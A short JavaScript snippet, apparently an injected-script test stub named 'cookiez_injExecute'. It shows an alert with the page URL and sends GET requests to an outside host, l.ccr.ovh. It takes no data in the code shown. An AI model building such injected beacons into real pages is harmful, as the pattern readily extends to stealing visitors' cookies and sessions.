function httpGetAsync(theUrl, callback)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() { 
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
            callback(xmlHttp.responseText);
    }
    xmlHttp.open("GET", theUrl, true); // true for asynchronous 
    xmlHttp.send(null);
}

function cookiez_injExecute() {
	alert(window.location.href);
	
	if(location.protocol == "http:") {
		httpGetAsync("http://l.ccr.ovh/test.php", function() {
			console.log("co");
		});
	}
	
	httpGetAsync("http://l.ccr.ovh/test.php", function() {
		console.log("co");
	});
}